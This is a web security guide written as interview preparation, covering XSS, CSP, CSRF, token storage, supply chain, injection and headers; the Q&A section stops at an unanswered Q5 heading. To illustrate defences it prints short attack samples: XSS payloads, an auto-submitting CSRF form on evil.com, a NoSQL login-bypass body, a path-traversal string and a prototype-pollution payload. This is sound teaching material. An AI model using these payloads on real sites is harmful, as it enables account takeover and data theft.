# Web Security — Complete Guide

Security questions in interviews are rarely about exotic attacks. They're about whether you know **where the trust boundaries are** and whether you reach for the control that actually works rather than the one that feels reassuring.

This guide covers the threats a web engineer owns: XSS and CSP, CSRF, token theft and session design, clickjacking, supply-chain attacks, injection, secrets, and the headers that tie it together. The CORS mechanics live in the CORS guide and the OAuth flows in the OAuth & SSO guide; this is the surrounding threat model.

---

## Table of Contents

- [1. The Threat Model](#1-the-threat-model)
- [2. XSS](#2-xss)
- [3. Content Security Policy and Trusted Types](#3-content-security-policy-and-trusted-types)
- [4. CSRF](#4-csrf)
- [5. Tokens, Sessions and Cookies](#5-tokens-sessions-and-cookies)
- [6. Clickjacking and Framing](#6-clickjacking-and-framing)
- [7. Supply Chain Security](#7-supply-chain-security)
- [8. Injection Beyond XSS](#8-injection-beyond-xss)
- [9. Secrets Management](#9-secrets-management)
- [10. Authentication Hardening](#10-authentication-hardening)
- [11. Security Headers Reference](#11-security-headers-reference)
- [12. Interview Questions & Answers](#12-interview-questions-answers)
- [13. Tricky Questions](#13-tricky-questions)
- [14. Cheat Sheet](#14-cheat-sheet)
- [15. References](#15-references)

---

## 1. The Threat Model

Almost every web vulnerability is one of three failures:

```
1. Confused identity   — the server acted on behalf of the wrong principal
                         (CSRF, IDOR, session fixation, confused deputy)
2. Confused data/code  — data was interpreted as code
                         (XSS, SQL injection, command injection, template injection,
                          prototype pollution, prompt injection)
3. Confused trust      — code you didn't audit ran with your privileges
                         (supply chain, malicious dependency, third-party script)
```

Naming which category an attack belongs to is a strong interview move, because the *defence* follows from the category. Confused identity is fixed by verifying the principal at every operation. Confused data/code is fixed by keeping a strict separation between the two — parameterisation, escaping, contextual output encoding. Confused trust is fixed by reducing what you trust and constraining what it can reach.

**The two principles that generate most correct answers:**

**Defence in depth.** No single control is trusted to hold. A CSP does not excuse unsanitised HTML; `SameSite` cookies do not excuse a missing CSRF token; a WAF does not excuse an unparameterised query. Interviewers probe this by asking "what if that fails?" — a candidate with only one layer has no answer.

**The client is never a security boundary.** Anything running in a browser is under the user's control: hidden fields, disabled buttons, client-side validation, obfuscated JavaScript, a route guard. All of it is UX. Every rule must be enforced server-side, and this single sentence answers a surprising fraction of security questions.

---

## 2. XSS

XSS is executing attacker-controlled JavaScript in your origin. That matters because the attacker's script gets **everything the user has**: any token JavaScript can read, the ability to make authenticated requests as the user, the DOM, and the keyboard.

### 2.1 The Three Types

| Type | Where the payload lives | Example |
|---|---|---|
| **Stored (persistent)** | your database — served to every viewer | a comment containing `<script>` |
| **Reflected** | the request — echoed into the response | `?q=<script>` rendered into the search results page |
| **DOM-based** | never reaches the server | `element.innerHTML = location.hash` |

DOM-based XSS is the one that survives server-side defences, because the payload can live in the fragment (`#...`), which browsers **do not send to the server**. Your WAF, your server-side escaping and your logs never see it. This is worth knowing precisely — it's a common follow-up.

### 2.2 The Real Fix: Contextual Output Encoding

The framework does this for you, which is why modern XSS is almost always a case of *escaping the framework*:

```jsx
function Example() {
  return (
    <>
      {/* Safe — React escapes text children */}
      <div>{userInput}</div>

      {/* Unsafe — the escape hatch is literally named after the risk */}
      <div dangerouslySetInnerHTML={{ __html: userInput }} />
    </>
  );
}
```

The critical concept is that **escaping depends on context**. The same string needs different treatment in HTML text, an HTML attribute, a URL, inside a `<script>`, and inside CSS:

```html
<div>TEXT CONTEXT</div>                          <!-- escape < > & -->
<div title="ATTRIBUTE CONTEXT">                  <!-- escape quotes too -->
<a href="URL CONTEXT">                           <!-- validate the SCHEME -->
<script>var x = "JS CONTEXT";</script>           <!-- different rules entirely -->
<div style="color: CSS CONTEXT">                 <!-- different again -->
```

The `href` case is the one people miss most often, and it's a genuine bug in a lot of React code:

```jsx
// XSS despite React "escaping" — javascript: URLs execute on click
<a href={userProvidedUrl}>Link</a>               // userProvidedUrl = "javascript:alert(1)"

// Fix: validate the scheme against an allowlist
const safe = /^(https?:|mailto:|\/)/i.test(url) ? url : '#';
```

React warns about `javascript:` URLs in development and blocks some cases, but the reliable fix is your own scheme allowlist. The same applies to `src`, `formaction`, `xlink:href` and `srcdoc`.

### 2.3 When You Must Render HTML

Rich-text editors, markdown, and CMS content are legitimate cases. Sanitise with a maintained library — never a regex:

```js
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'ol', 'li', 'code', 'pre'],
  ALLOWED_ATTR: ['href', 'title'],
  ALLOWED_URI_REGEXP: /^(?:https?|mailto):/i,
});
```

Why not a regex: HTML is not a regular language, and the bypass space is enormous — `<img src=x onerror=alert(1)>`, `<svg onload=...>`, `<iframe srcdoc=...>`, mixed-case and null-byte variants, mutation XSS where the browser's parser *rewrites* your sanitised output into something executable. Maintained sanitisers exist because people keep finding new bypasses; your regex will not be updated.

**Sanitise on output, not (only) on input.** Input sanitisation loses information, breaks legitimate content, and is applied inconsistently as new write paths appear. Store what the user typed; encode correctly for whatever context you render into. The exception is validation — rejecting structurally invalid input at the edge is good, but it isn't the XSS defence.

### 2.4 The DOM Sinks

```js
// Every one of these parses its argument as HTML or as code.
element.innerHTML = x;                    // also: outerHTML, insertAdjacentHTML
document.write(x);                        // also: eval(x), new Function(x)
setTimeout(x);                            // string form only — also setInterval(x)
element.setAttribute('onclick', x);       // and: location = x  (javascript: URLs)
el.srcdoc = x;                            // jQuery: $(x), .html(x), .append(x)
```

Anything assigning attacker-influenced data into one of these is a potential DOM XSS. A React codebase's realistic list is short — `dangerouslySetInnerHTML`, `href`/`src` interpolation, a third-party widget, and any direct DOM manipulation in a `useEffect`.

### 2.5 XSS in Modern Contexts

- **Markdown rendering** — markdown allows raw HTML by default in most parsers. Disable it or sanitise the output.
- **LLM output** — the model's response is untrusted input that took a scenic route. Never render it as raw HTML, and never `eval` generated code. See the AI & LLM Engineering guide's security section, including how a rendered markdown *image* becomes an exfiltration channel.
- **SVG uploads** — SVG is XML that can contain `<script>`. Serve user-uploaded SVGs from a separate origin, or sanitise them, or serve with `Content-Disposition: attachment`.
- **`postMessage` handlers** — always check `event.origin` against an allowlist before trusting the data. An unchecked handler is a cross-origin entry point straight into your DOM.
- **`window.opener`** — a page you open with `target="_blank"` can navigate your page via `window.opener` unless you set `rel="noopener"` (now the browser default, but still worth being explicit).

---

## 3. Content Security Policy and Trusted Types

### 3.1 CSP Is Defence in Depth, Not a Fix

CSP restricts what the browser will execute and load. It does not fix an injection — it limits what an injection can *do*. Reaching for CSP instead of fixing the sink is the wrong order; reaching for it *as well* is correct.

### 3.2 A Policy Worth Recommending

Host allowlists are largely obsolete — they're bypassable via JSONP endpoints and open redirects on allowlisted CDNs, and they're a maintenance burden. **Nonce-based with `strict-dynamic`** is the modern recommendation:

```
Content-Security-Policy:
  script-src 'nonce-{RANDOM_PER_RESPONSE}' 'strict-dynamic' https:;
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'self';
  require-trusted-types-for 'script';
```

```html
<script nonce="{RANDOM_PER_RESPONSE}">/* runs */</script>
<script>/* injected by an attacker — no nonce, blocked */</script>
```

What each part does and why it's there:

- **`'nonce-...'`** — only scripts carrying this response's random nonce execute. The nonce must be **cryptographically random and regenerated per response**; a static nonce is worthless because an attacker can just read it and include it.
- **`'strict-dynamic'`** — a script that already passed the nonce check can create further scripts programmatically. This is what makes CSP practical with bundlers and third-party loaders, which inject `<script>` tags at runtime.
- **`object-src 'none'`** — kills the `<object>`/`<embed>` bypass class.
- **`base-uri 'self'`** — stops an injected `<base>` tag redirecting every relative URL on the page to an attacker's host. Cheap and frequently omitted.
- **`frame-ancestors`** — the modern replacement for `X-Frame-Options` (§6).

Two hard rules: **`'unsafe-inline'` in `script-src` defeats the entire policy**, and **`'unsafe-eval'` re-opens the `eval`/`new Function` sink**. If a third-party script needs either, that's a vendor problem, not a policy exception. (Note that a nonce or hash causes browsers to *ignore* `'unsafe-inline'`, so leaving it in as a legacy fallback is safe.)

### 3.3 Deploying It Without Breaking Production

```
Content-Security-Policy-Report-Only: <policy>; report-to csp-endpoint
```

Report-Only mode reports violations without blocking, so you deploy it, collect a week of real traffic, fix what you find, then enforce. Skipping this step is how CSP rollouts get reverted. Budget for noise — browser extensions generate a lot of violations you cannot fix.

### 3.4 Trusted Types

CSP restricts script *sources*. **Trusted Types** attacks the other half: it makes the dangerous DOM sinks refuse plain strings at all.

```
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types default dompurify
```

With that header, `element.innerHTML = someString` **throws**. It only accepts a `TrustedHTML` object produced by a policy you defined:

```js
const policy = trustedTypes.createPolicy('dompurify', {
  createHTML: (s) => DOMPurify.sanitize(s, { RETURN_TRUSTED_TYPE: true }),
});
element.innerHTML = policy.createHTML(userInput);   // must go through the policy
```

The strategic value is that it converts DOM XSS from "audit every sink forever, including in every dependency" into "audit the handful of policies." That's a structural fix rather than a vigilance-based one, and it's the strongest thing you can say about XSS prevention at scale.

---

## 4. CSRF

CSRF makes a victim's browser send an authenticated request the victim didn't intend. It works because **cookies are attached automatically** by the browser based on the destination, regardless of which site initiated the request.

```html
<!-- On evil.com. The victim's session cookie for bank.com rides along. -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```

Note what CSRF is **not**: the attacker cannot *read* the response (the same-origin policy prevents that). CSRF is a **write** attack — it's about causing a side effect, not stealing data.

### 4.1 The Layered Defence

**1. `SameSite` cookies — necessary, not sufficient.**

```
Set-Cookie: session=…; HttpOnly; Secure; SameSite=Lax; Path=/
```

`SameSite=Lax` (the modern browser default) blocks the cookie on cross-site **POST**, which stops the classic attack above. `Strict` blocks it on cross-site navigation too, which breaks "click a link in an email and arrive logged in."

The gaps that make it insufficient on its own, and this is the depth interviewers look for:

- **`Lax` still sends the cookie on a top-level cross-site `GET` navigation.** So a `GET` that mutates state is still exploitable — one more reason `GET` must never mutate.
- **`SameSite` is *site*, not *origin*.** Subdomains are same-site, so an XSS or a takeover on `blog.example.com` can forge requests to `app.example.com`.
- **Older clients and non-browser clients** may not enforce it.

**2. Anti-CSRF tokens — the actual control.** The attacker can cause a request but cannot read a value from your origin, so a secret the request must carry defeats them.

- **Synchroniser token**: server generates a token bound to the session, embeds it in the form, and verifies it on submit. Requires server-side state.
- **Double-submit cookie**: send the token in a cookie *and* require it in a header or body field; verify they match. Stateless, but weaker if an attacker can set cookies on your domain (a subdomain issue again) — so sign the token or bind it to the session.

**3. Validate `Origin`** (or `Sec-Fetch-Site`) on state-changing requests. Cheap and effective as an additional layer.

**4. Never let `GET` change state.** Half of CSRF exposure disappears with this rule.

### 4.2 What About APIs?

If your API is **token-based with the token in an `Authorization` header**, it is not CSRF-vulnerable — the browser does not attach that header automatically, and an attacker cannot read it to add it. This is the honest answer to "do we need CSRF protection?", and it's why the question is really "are you using cookies for authentication?"

But note the trap: many SPAs use `HttpOnly` cookies (correctly, to resist XSS) and *then* assume they're CSRF-immune because "we're an API." Cookie auth means CSRF applies, whatever shape your endpoints are. The two defences trade against each other, which is why you need both controls rather than choosing one.


---

## 5. Tokens, Sessions and Cookies

### 5.1 The Storage Question

This is the most-asked security question in frontend interviews, and the answer that scores is the one that refuses the premise.

| Storage | XSS-readable | Sent automatically | CSRF-exposed |
|---|---|---|---|
| `localStorage` / `sessionStorage` | **yes** | no | no |
| Non-`HttpOnly` cookie | **yes** | yes | yes |
| **`HttpOnly` cookie** | **no** | yes | yes |
| JS memory (a variable) | yes (same context) | no | no |

**Any token JavaScript can read is XSS-exfiltratable.** So `localStorage` versus in-memory is a debate about how *long* the attacker's window is, not about whether they get the token. In-memory is genuinely better — it doesn't survive a reload, so a one-shot injection may miss it — but it's a mitigation, not a fix.

The pattern to recommend is the **BFF (backend-for-frontend)**:

```
Browser ──[HttpOnly session cookie]──▶ Your BFF ──[access token]──▶ API
```

The browser holds only an opaque `HttpOnly; Secure; SameSite=Lax` session cookie. The BFF holds the actual OAuth tokens and attaches them server-side. **The browser never sees an access token**, so XSS cannot steal one — the best an injected script can do is make requests *through* your BFF as the user, which is worse than nothing but far better than a stealable bearer token they can replay from anywhere, indefinitely.

If a BFF isn't possible: access token **in memory only**, refresh token in an `HttpOnly` cookie **scoped to the refresh endpoint path**, short access-token lifetimes.

### 5.2 Cookie Attributes

```
Set-Cookie: session=abc;
  HttpOnly;              # JS cannot read it — the anti-XSS control
  Secure;                # HTTPS only
  SameSite=Lax;          # anti-CSRF baseline
  Path=/;
  Max-Age=3600;
  __Host- prefix         # see below
```

The **`__Host-` prefix** is underused and worth naming: a cookie named `__Host-session` is only accepted if it's `Secure`, has `Path=/`, and has **no `Domain` attribute** — which means it's locked to the exact host and **cannot be set by a subdomain**. That closes the subdomain cookie-injection hole that weakens both `SameSite` and double-submit CSRF tokens. `__Secure-` is the weaker variant (requires `Secure` but permits `Domain`).

### 5.3 Session and Token Design

- **Short access-token lifetimes** (5–15 minutes) so a stolen token expires quickly.
- **Refresh token rotation**: every refresh issues a new refresh token and invalidates the old one.
- **Reuse detection**: if an already-used refresh token is presented, that means theft — revoke the whole token family and force re-authentication. Rotation without reuse detection is half a control.
- **Handle the concurrent-refresh race.** Two tabs refreshing simultaneously must not each rotate and invalidate the other's token. Single-flight with a shared promise, plus cross-tab coordination via `BroadcastChannel` or `navigator.locks`.
- **Regenerate the session ID on privilege change** — login, and any elevation. Otherwise you're vulnerable to **session fixation**, where an attacker plants a known session ID before the victim logs in and inherits the authenticated session.
- **Revocation must be real.** A stateless JWT cannot be revoked before it expires, which is the central JWT trade-off: you gain not hitting the database on every request, and you lose the ability to log someone out. The usual resolutions are short lifetimes plus a revocation list for the exceptional case, or an opaque session token with a server-side store (which is the right default for most products).
- **Validate JWTs properly.** Verify the signature, and **pin the expected algorithm** — accepting the token's own `alg` header enables the `alg: none` and RS256→HS256 confusion attacks. Check `exp`, `iss`, `aud`, and the key ID against your JWKS. Details in the OAuth & SSO guide.

### 5.4 IDOR — The Most Common Real Vulnerability

Not exotic, and extremely common:

```js
// ✗ Vulnerable: the ID comes from the caller, and nothing checks ownership
app.get('/api/invoices/:id', auth, async (req, res) => {
  res.json(await db.invoices.findById(req.params.id));   // any id works
});

// ✓ Scope the QUERY to the authenticated principal
app.get('/api/invoices/:id', auth, async (req, res) => {
  const invoice = await db.invoices.findOne({
    _id: req.params.id,
    orgId: req.user.orgId,          // ownership is part of the query
  });
  if (!invoice) return res.sendStatus(404);              // 404, not 403
  res.json(invoice);
});
```

Two details that show experience. **Scope the query rather than validating the parameter** — a `findById` followed by an `if` is one refactor away from being wrong, whereas a scoped query cannot return someone else's row. And **return 404 rather than 403** for a resource the user may not see, because 403 confirms the resource exists, which is an enumeration oracle.

Sequential integer IDs make enumeration trivial; UUIDs are not an access control but they do remove the easy scan.

---

## 6. Clickjacking and Framing

An attacker frames your page, makes the iframe transparent, and overlays their own UI so the victim's click lands on your button — "Delete account" under a "Play video" graphic.

```
Content-Security-Policy: frame-ancestors 'self' https://partner.example.com;
X-Frame-Options: DENY          # legacy fallback for very old browsers
```

`frame-ancestors` is the modern control and **supersedes `X-Frame-Options`** — where both are present, CSP wins in supporting browsers. `frame-ancestors` also supports multiple origins, which `X-Frame-Options: ALLOW-FROM` never did reliably.

For genuinely sensitive actions, add a second layer: require re-authentication or an explicit confirmation step for destructive operations, so a single stolen click can't do irreversible damage.

The related concern when **you** embed someone else: `<iframe sandbox>` restricts what the framed content can do (`allow-scripts`, `allow-same-origin`, `allow-forms` — grant only what's needed), and `allow` controls Permissions Policy delegation. Never combine `allow-scripts` with `allow-same-origin` for untrusted content — together they let the frame remove its own sandbox.

---

## 7. Supply Chain Security

The threat that grew fastest and gets skipped most often in interview answers. A malicious dependency runs with your full privileges — in CI it can read your secrets, and in the browser it can do anything your first-party code can.

### 7.1 The Attack Shapes

- **Typosquatting** — `reqeusts`, `lodahs`, `crossenv`. Published, waiting for a typo.
- **Dependency confusion** — publishing a public package with the same name as your *private* internal one, hoping your resolver prefers the public registry.
- **Compromised maintainer account** — a legitimate, widely-used package gets a malicious version. This is the most damaging shape because the package is already in everyone's lockfile.
- **Malicious `postinstall` scripts** — arbitrary code execution at install time, including in CI where your deploy credentials live.
- **Protestware / abandoned packages** transferred to a new owner.
- **Compromised CDN or a third-party tag** — an injected script on your page has the same privileges as yours.

### 7.2 The Controls

```bash
npm ci                       # install from the lockfile ONLY — never `npm install` in CI
npm ci --ignore-scripts      # block install scripts; allowlist the few that need them
npm audit signatures         # verify registry signatures / provenance attestations
npm audit --audit-level=high # gate the build
```

- **Commit lockfiles and install from them.** `npm ci` fails if the lockfile and `package.json` disagree, which is the point.
- **`--ignore-scripts` by default.** Most packages don't need install scripts; the ones that do (native builds) can be allowlisted. This single flag removes the entire install-time RCE class.
- **Verify provenance.** Packages published with provenance attestation prove which repo and workflow built them. Verifying it defeats a lot of account-compromise scenarios.
- **Pin exact versions for anything sensitive**, and use `overrides`/`resolutions` to force a patched transitive dependency.
- **Renovate/Dependabot with a review gate** — automated *detection*, human *merge*. Auto-merging dependency updates is auto-merging supply-chain risk.
- **Minimise the dependency count.** A 4-line utility package is a permanent trust relationship for something you could write. Prefer platform APIs — this is a real argument for native `fetch`, `node:test` and `structuredClone` over their npm equivalents.
- **Audit the transitive graph, not the direct list.** `npm ls --all` is sobering; the risk lives in the depth.
- **Separate CI privileges.** The job that installs dependencies should not hold production deploy credentials. Then an install-time compromise can't reach production.

### 7.3 Third-Party Scripts in the Browser

Every third-party `<script>` you include is a full-privilege participant in your origin. Analytics, chat widgets, tag managers, A/B tools — all of them can read your DOM, your non-`HttpOnly` cookies, and anything in `localStorage`.

```html
<!-- SRI: the browser verifies the hash and refuses a modified file -->
<script src="https://cdn.example.com/lib.js"
        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
        crossorigin="anonymous"></script>
```

**Subresource Integrity** protects against a compromised or modified CDN file — but note it cannot protect a script that's *designed* to change (most analytics loaders), which is exactly why SRI is under-used. For those, the controls are a strict CSP limiting what the script can reach, loading them in a sandboxed iframe where feasible, and a hard rule that marketing cannot add tags without review.

---

## 8. Injection Beyond XSS

**SQL injection** — the fix is parameterisation, always. Not escaping, not a blocklist:

```js
db.query('SELECT * FROM users WHERE email = $1', [email]);   // ✓ parameterised
db.query(`SELECT * FROM users WHERE email = '${email}'`);    // ✗
```

An ORM parameterises by default, but raw-query escape hatches (`$queryRaw`, `sequelize.query`) reintroduce the risk. And note that **identifiers cannot be parameterised** — a dynamic `ORDER BY ${column}` needs an allowlist, not escaping.

**NoSQL injection** — a JSON body can smuggle operators:

```js
// POST { "email": {"$ne": null}, "password": {"$ne": null} }  → logs in as someone
db.users.findOne({ email: req.body.email, password: req.body.password });
```

Validate types before querying (`z.string()` rejects an object), which is why schema validation at the edge is a security control and not just DX.

**Command injection** — never build a shell string from input. Use the array form so there's no shell to interpret metacharacters:

```js
execFile('convert', [inputPath, '-resize', '100x100', outputPath]);   // ✓ no shell
exec(`convert ${inputPath} out.png`);                                 // ✗
```

**SSRF** — your server fetches a URL the user supplied, and the attacker points it at internal infrastructure (`169.254.169.254` for cloud metadata, `localhost`, a private subnet). Defences: allowlist destination hosts, resolve DNS and validate the *resolved IP* isn't private (and re-validate after redirects, to defeat DNS rebinding), block redirects or cap them, and use a dedicated egress proxy with no access to internal networks.

**Path traversal** — `../../etc/passwd`. Resolve the path and verify it's still inside the intended directory:

```js
const full = path.resolve(BASE, userPath);
if (!full.startsWith(BASE + path.sep)) throw new Error('Invalid path');
```

**Prototype pollution** — a JS-specific one worth knowing:

```js
// A deep-merge of { "__proto__": { "isAdmin": true } } can affect EVERY object
merge({}, JSON.parse(userInput));
if (someObject.isAdmin) { /* now true for objects that never set it */ }
```

Defences: reject `__proto__`, `constructor` and `prototype` keys; use `Object.create(null)` or a `Map` for user-keyed data; `Object.freeze(Object.prototype)` in hardened environments; and prefer maintained merge utilities that guard against it.

**ReDoS** — a catastrophically-backtracking regex on user input hangs the event loop, taking the whole Node process down (see the Regex guide). Avoid nested quantifiers, cap input length, and prefer a parser for structured input.

**Open redirect** — `?next=https://evil.com` used in a login flow is a phishing primitive and can leak tokens. Allowlist the redirect target, or only permit relative paths.

**Mass assignment** — `Object.assign(user, req.body)` lets the caller set `role: 'admin'`. Pick fields explicitly.

---

## 9. Secrets Management

- **Nothing secret reaches the client.** Anything in a bundler-public variable (`NEXT_PUBLIC_*`, `VITE_*`, `REACT_APP_*`) is **published**. This is a leading cause of leaked API keys, because the prefix looks like configuration rather than a publication mechanism.
- **A key in a mobile app binary is public**, however it's obfuscated.
- **Secrets belong in a manager** (AWS Secrets Manager, Vault, cloud KMS) with rotation, not in `.env` files committed by accident. `.env` in `.gitignore` is necessary and not sufficient — add a pre-commit secret scanner (`gitleaks`, `trufflehog`) and enable your platform's push protection.
- **A leaked secret must be rotated, not deleted.** Removing it from the latest commit leaves it in history, in forks, and in anything that cloned the repo. Treat any exposure as compromise, rotate immediately, then clean history.
- **Scope credentials narrowly.** Read-only where reads suffice; per-environment; per-service. This is what limits the blast radius when something does leak.
- **Never log secrets**, including in error objects. A request logger that dumps headers logs your `Authorization` values into a system with much broader access than the secret store.

---

## 10. Authentication Hardening

- **Password storage: Argon2id** (preferred) or bcrypt with a sensible cost. Never SHA-256 — general-purpose hashes are fast, which is precisely wrong for passwords. Never your own scheme.
- **Rate limiting, layered**: per IP, per account, and globally. Per-IP alone is defeated by a botnet; per-account alone lets an attacker lock out users. Prefer exponential back-off or a CAPTCHA over hard lockouts, which are a denial-of-service vector.
- **Credential stuffing** is the real threat, not brute force — attackers use passwords breached elsewhere. Check new passwords against a breached-password list (the Pwned Passwords k-anonymity API lets you do this without sending the password), and monitor for distributed low-rate attempts across many accounts, which per-account limits miss.
- **Don't leak account existence.** "Invalid email or password" for both cases, identical response times, and the same response for signup and password-reset regardless of whether the account exists.
- **Constant-time comparison** for secrets and tokens (`crypto.timingSafeEqual`) — `===` on strings short-circuits and leaks length and prefix information through timing.
- **MFA, and prefer passkeys/WebAuthn** — phishing-resistant because the credential is bound to the origin. SMS OTP is the weakest common factor (SIM swap, SS7). And per WCAG 2.2's 3.3.8, **don't block paste in OTP fields** — it breaks password managers and is an accessibility failure.
- **Re-authenticate for sensitive actions** — changing email, password, MFA settings, or a payout destination.
- **Invalidate sessions on password change** — everywhere, not just the current device. That's the whole point of a password change after a compromise.

---

## 11. Security Headers Reference

```
# Force HTTPS (only add preload when you're certain)
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload

# The main injection control
Content-Security-Policy: script-src 'nonce-{RANDOM}' 'strict-dynamic' https:;
                         object-src 'none'; base-uri 'self'; frame-ancestors 'self';
                         require-trusted-types-for 'script'

# Stop MIME sniffing turning a text upload into a script
X-Content-Type-Options: nosniff

# Don't leak full URLs (with tokens in query strings) to third parties
Referrer-Policy: strict-origin-when-cross-origin

# Deny capabilities you don't use
Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()

# Cross-origin isolation — required for SharedArrayBuffer; also hardens against
# XS-Leaks and Spectre-style attacks
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Resource-Policy: same-origin

# Legacy clickjacking fallback (frame-ancestors supersedes it)
X-Frame-Options: DENY
```

Notes worth having: **`X-XSS-Protection` is obsolete** — the browser XSS auditors it controlled were removed for being bypassable and themselves exploitable; set it to `0` or omit it. **HSTS `preload` is close to irreversible**, so don't add it until every subdomain is HTTPS-ready. And **`COOP`/`COEP` break third-party embeds** that don't send CORP headers, so roll them out in report-only mode first.


---

## 12. Interview Questions & Answers

### Beginner

---

**Q1: What is XSS and how do you prevent it?**

XSS is executing attacker-controlled JavaScript in your origin. The impact is total: the attacker's script gets any token JavaScript can read, can make authenticated requests as the user, can read the DOM and can capture keystrokes.

Three types, and the third is the one that defeats server-side defences:

- **Stored** — the payload is in your database and served to every viewer.
- **Reflected** — the payload is in the request and echoed into the response.
- **DOM-based** — the payload **never reaches the server**. `element.innerHTML = location.hash` is exploitable via the fragment, which browsers don't send to the server, so your WAF, your server-side escaping and your logs never see it.

The real fix is **contextual output encoding**, and frameworks do it for you — which is why modern XSS is almost always a case of escaping the framework. In React that means `dangerouslySetInnerHTML`, and the one people miss:

```jsx
<a href={userUrl}>Link</a>   // userUrl = "javascript:alert(1)" → XSS on click
```

React escapes *text*, not URL schemes. You need your own allowlist (`/^(https?:|mailto:|\/)/i`), and the same applies to `src`, `formaction` and `srcdoc`.

When you genuinely must render HTML — a rich-text editor, markdown, CMS content — sanitise with **DOMPurify**, never a regex. HTML isn't a regular language, and the bypass space includes `<img onerror>`, `<svg onload>`, mutation XSS where the browser's parser rewrites your "sanitised" output into something executable, and a long tail of encoding variants. Maintained sanitisers exist because people keep finding new bypasses.

**Sanitise on output, not input** — input sanitisation loses information, breaks legitimate content, and gets applied inconsistently as new write paths appear. Store what the user typed; encode for the context you render into.

Then defence in depth: a **strict CSP** (nonce + `strict-dynamic`) limits what an injection can do, and **Trusted Types** makes the dangerous DOM sinks refuse plain strings entirely. Neither excuses the sink fix — they're the second layer.

---

**Q2: What is CSRF and how is it different from XSS?**

They're often confused and are almost opposites.

**XSS** is an attacker running **their code in your origin.** They get read *and* write, and full access to whatever the user has.

**CSRF** is an attacker causing **the victim's browser to send a request the victim didn't intend.** The attacker cannot read the response — the same-origin policy prevents that — so CSRF is a **write-only** attack. It's about side effects, not data theft.

It works because **cookies are attached automatically** by the browser based on the destination, regardless of which site initiated the request:

```html
<!-- on evil.com — the victim's bank.com session cookie rides along -->
<form action="https://bank.com/transfer" method="POST">…</form>
<script>document.forms[0].submit();</script>
```

Defences, layered:

1. **`SameSite=Lax` cookies** (the modern browser default) block the cookie on cross-site POST. Necessary but **not sufficient**: `Lax` still sends it on a top-level cross-site **GET** navigation, `SameSite` is *site*-scoped so subdomains count as same-site, and older or non-browser clients may not enforce it.
2. **Anti-CSRF tokens** — the actual control. The attacker can cause a request but cannot read a value from your origin. Synchroniser token (server-side state) or signed double-submit cookie.
3. **Validate `Origin`** or `Sec-Fetch-Site` on state-changing requests.
4. **Never let `GET` mutate state** — that removes half the exposure.

And the useful nuance: if your API authenticates via a **token in an `Authorization` header**, it isn't CSRF-vulnerable, because the browser doesn't attach that header automatically. But many SPAs correctly use `HttpOnly` cookies to resist XSS and *then* wrongly assume they're CSRF-immune because "we're an API." Cookie auth means CSRF applies, whatever shape your endpoints are — which is exactly why you need both controls rather than picking one.

---

**Q3: Where should you store a JWT in a browser?**

The answer that scores refuses the premise: **any token JavaScript can read is XSS-exfiltratable**, so this is a question about the size of the attacker's window, not about whether they get the token.

| Storage | XSS-readable | CSRF-exposed |
|---|---|---|
| `localStorage` | **yes** | no |
| Non-`HttpOnly` cookie | **yes** | yes |
| **`HttpOnly` cookie** | **no** | yes |
| JS memory | yes (same context) | no |

`localStorage` is the worst common choice: persistent, so a single injection at any point captures a token the attacker can replay from anywhere until it expires. In-memory is better — it doesn't survive a reload, so a one-shot injection may miss it — but it's a mitigation, not a fix.

**What I'd actually recommend is the BFF pattern:**

```
Browser ──[HttpOnly session cookie]──▶ Your BFF ──[access token]──▶ API
```

The browser holds only an opaque `HttpOnly; Secure; SameSite=Lax` session cookie; the backend-for-frontend holds the real tokens and attaches them server-side. **The browser never sees an access token.** The best an injected script can then do is make requests *through* your BFF as the user — bad, but far better than a stealable bearer token replayable from anywhere.

If a BFF isn't possible: access token in memory only, refresh token in an `HttpOnly` cookie scoped to the refresh endpoint path, short access-token lifetimes.

Because cookies bring CSRF, add `SameSite` plus a CSRF token, and use the **`__Host-` prefix** so the cookie can't be set by a subdomain. And note the JWT trade-off directly: a stateless JWT **cannot be revoked** before expiry, so you get "no database hit per request" and lose "log this person out." For most products an opaque session token with a server-side store is the better default.

---

### Intermediate

---

**Q4: Design a CSP for a React SPA. What would you avoid?**

I'd start with what I'd avoid, because the common policies are the ineffective ones.

**Avoid host allowlists.** They're largely obsolete — bypassable via JSONP endpoints and open redirects on allowlisted CDNs, and a permanent maintenance burden. **Avoid `'unsafe-inline'` in `script-src`** — it defeats the entire policy, since injected inline script is exactly what you're blocking. **Avoid `'unsafe-eval'`**, which re-opens the `eval`/`new Function` sink.

The modern recommendation is **nonce-based with `strict-dynamic`**:

```
Content-Security-Policy:
  script-src 'nonce-{RANDOM_PER_RESPONSE}' 'strict-dynamic' https:;
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'self';
  require-trusted-types-for 'script'
```

Piece by piece: the **nonce** must be cryptographically random and regenerated per response (a static nonce is worthless — an attacker just reads it). **`strict-dynamic`** lets a script that already passed the nonce check create further scripts programmatically, which is what makes CSP workable with bundlers and third-party loaders that inject tags at runtime. **`object-src 'none'`** kills the `<object>`/`<embed>` bypass class. **`base-uri 'self'`** stops an injected `<base>` tag repointing every relative URL on the page — cheap and very often omitted. **`frame-ancestors`** is the modern clickjacking control.

**Deployment matters as much as the policy.** Ship it as `Content-Security-Policy-Report-Only` with a reporting endpoint, collect a week of real traffic, fix what you find, then enforce. Skipping that step is how CSP rollouts get reverted on the first Monday. Budget for noise — browser extensions generate violations you can't fix.

For a **pure SPA** there's a wrinkle worth mentioning: per-response nonces require a server rendering the document. A statically-hosted `index.html` can't do that, so you either move to hash-based CSP for your known inline scripts, render the document at the edge, or accept a weaker policy — and that's a real architectural input rather than a detail.

I'd add **Trusted Types** (`require-trusted-types-for 'script'`) because it's the structural fix: it makes `innerHTML` and friends throw on plain strings, so DOM XSS goes from "audit every sink forever, including in dependencies" to "audit the handful of policies."

---

**Q5: How do you protect against supply chain attacks?**

